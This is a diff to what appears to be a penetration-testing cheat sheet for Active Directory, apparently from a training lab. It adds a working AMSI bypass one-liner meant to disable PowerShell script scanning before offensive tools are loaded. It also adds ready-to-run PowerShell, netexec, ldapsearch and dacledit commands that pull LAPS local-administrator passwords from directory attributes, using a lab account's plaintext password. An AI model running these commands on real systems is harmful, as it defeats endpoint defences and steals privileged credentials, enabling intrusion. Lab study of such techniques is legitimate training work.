@@ -131,6 +131,13 @@ Get-MpComputerStatus
 ```
 RealTimeProtectionEnabled parameter is set to True
 ```
+## AMSI Bypass
+Before loading any PowerShell offensive tooling (PowerView, SharpHound, Rubeus, etc.), patch AMSI in the current process so script content isn't inspected at runtime:
+```
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+Bypass strings like this get signatured and patched regularly — check for a current one before relying on it.
+## LAPS
 ```
 Find-LAPSDelegatedGroups
 ```
@@ -139,4 +146,25 @@ Find-AdmPwdExtendedRights
 ```
 ```
 Get-LAPSComputers
+```
+### Reading the Password
+Legacy LAPS stores the plaintext password in `ms-Mcs-AdmPwd`:
+```
+Get-ADComputer -Filter * -Properties ms-mcs-admpwd | select Name,ms-mcs-admpwd
+```
+```
+netexec ldap 172.16.5.5 -u forend -p Klmcargo2 -M laps
+```
+Windows LAPS (the newer client) is a different attribute, not a rename — `msLAPS-Password` in cleartext mode, or `msLAPS-EncryptedPassword` in encrypted mode (requires being an authorized decryptor). Check which one is populated before assuming legacy LAPS is in play:
+```
+Get-ADComputer -Filter * -Properties msLAPS-Password,msLAPS-EncryptedPassword | select Name,msLAPS-Password,msLAPS-EncryptedPassword
+```
+From Linux, anonymous or authenticated LDAP works the same way:
+```
+ldapsearch -H ldap://172.16.5.5 -x -D "INLANEFREIGHT\forend" -w Klmcargo2 -b "DC=INLANEFREIGHT,DC=LOCAL" "(ms-mcs-admpwd=*)" ms-mcs-admpwd
+```
+### Who Can Read It
+Rather than guessing, check who has `ExtendedRight` (legacy) or the dedicated `ReadLAPSPassword` edge (Windows LAPS) over a computer object — BloodHound will show this directly, or check the ACL manually:
+```
+python3 dacledit.py -action read -target 'ACADEMY-EA-MS01$' -principal forend INLANEFREIGHT.LOCAL/forend:Klmcargo2
 ```
